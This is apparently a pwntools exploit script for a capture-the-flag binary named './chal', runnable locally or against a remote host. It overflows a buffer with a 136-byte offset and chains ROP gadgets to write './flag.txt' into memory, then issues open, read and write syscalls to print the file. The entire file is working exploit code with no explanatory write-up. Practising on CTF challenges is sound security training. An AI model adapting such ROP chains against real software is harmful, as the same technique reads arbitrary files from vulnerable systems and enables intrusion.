from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b*0x47a0f9
continue
'''.format(**locals())

exe = './chal' #change this
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
recvunt = lambda msg: io.recvuntil(msg)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

mov_qword = 0x000000000048870a #: mov qword ptr [rsi], rdx ; ret
write_addr_1 = 0x4c6000
write_addr_2 = 0x4c9000
flagtxt1 = b'./flag.t'
flagtxt2 = b'xt'.ljust(8, b'\x00')
pop_rdi = 0x000000000040204f #: pop rdi ; ret
pop_rsi = 0x000000000040a0be #: pop rsi ; ret
pop_rdx_rbx = 0x000000000048630b #: pop rdx ; pop rbx ; ret
pop_rax = 0x0000000000450507 #: pop rax ; ret

syscall = 0x47a0f9 #: syscall; ret

io = start()
offset = b'A' * 136

payload = flat(
    offset,
    pop_rdx_rbx,
    flagtxt1,
    b'A' * 8,
    pop_rsi,
    write_addr_1,
    mov_qword,
    pop_rdx_rbx,
    flagtxt2,
    b'A' * 8,
    pop_rsi,
    write_addr_1+0x8,
    mov_qword
    )
#open
payload += flat(
    pop_rdi,
    write_addr_1,
    pop_rsi,
    0x0,
    pop_rdx_rbx,
    0x0,
    0x0,
    pop_rax,
    0x2,
    syscall
    )
#read
payload += flat(
    pop_rdi,
    5,
    pop_rsi,
    write_addr_2,
    pop_rdx_rbx,
    0x50,
    0,
    pop_rax,
    0,
    syscall,
)
#write 
payload += flat(
    pop_rdi,
    1,
    pop_rax,
    1,
    syscall
    )
sla(b'>', payload)

io.interactive()